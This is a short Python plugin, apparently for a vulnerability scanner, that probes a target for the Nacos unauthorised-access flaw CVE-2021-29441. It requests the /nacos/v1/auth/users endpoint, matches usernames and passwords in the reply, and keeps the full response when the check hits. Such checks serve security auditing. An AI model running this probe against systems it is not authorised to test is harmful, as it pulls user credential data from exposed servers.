#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {}
  ret['links'] = ['https://blog.csdn.net/Hoopy_Hoopy/article/details/120283270','https://mp.weixin.qq.com/s/du0OZ-vVrZcEcB0NCNM1Nw']
  ret['huixian'] = ''
  ret['method'] = 'get'
  ret['bugname'] = "Nacos未授权访问 CVE-2021-29441"
  ret['level'] = "high"
  ret['FOFA'] = ''
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False
  return ret

def run(url,ua):
  ret = msg()
  headers = {
    "User-Agent": ua
  }
  target ="/nacos/v1/auth/users?pageNo=1&pageSize=100"
  url1 = url + target
  ret['url'] = url1
  try:
    res = requests.get(url1, headers=headers,timeout=5,verify=False)
    # print(res.text)
    if re.search(r'totalCount.*?pageNumber.*?pagesAvailable.*?pageItems.*?username.*?password.*?',res.text,re.S):
      ret['ifbug'] = True
      ret['huixian'] = res.text
      res.close()
      return ret
    else:
      return ret
  except:
    return ret